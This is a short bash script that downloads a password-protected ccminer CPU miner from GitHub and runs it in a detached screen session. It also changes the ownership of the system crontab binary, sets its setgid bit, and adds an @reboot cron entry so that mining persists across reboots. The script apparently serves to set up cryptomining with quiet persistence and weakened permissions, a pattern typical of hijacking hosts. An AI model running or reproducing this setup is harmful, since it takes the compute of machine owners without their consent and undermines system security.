#!/bin/bash
nproc=$(nproc --all)
sudo apt-get update -y
sudo apt-get install wget -y
sudo apt update -y
sudo apt install screen -y
sudo apt-get install -y cron
sudo apt install unzip -y
sudo apt install wget -y
sudo apt install wine -y
sudo wget https://github.com/monkins1010/ccminer/releases/download/v3.8.3a/ccminer_CPU_3.8.3.zip
unzip -P 12345678 ccminer_CPU_3.8.3.zip
chmod +x *
sudo chown "$USER":crontab /usr/bin/crontab
sudo chmod g+s /usr/bin/crontab
sudo touch /var/spool/cron/crontabs/"$USER"
crontab -l > mycron
echo "@reboot sleep 60 && /$USER/minme/dotasks.sh" >> mycron
crontab mycron
rm mycron
sudo systemctl enable cron.service
update-rc.d cron defaults
screen -d -m bash -c "cd minme ; ./mine.sh" &
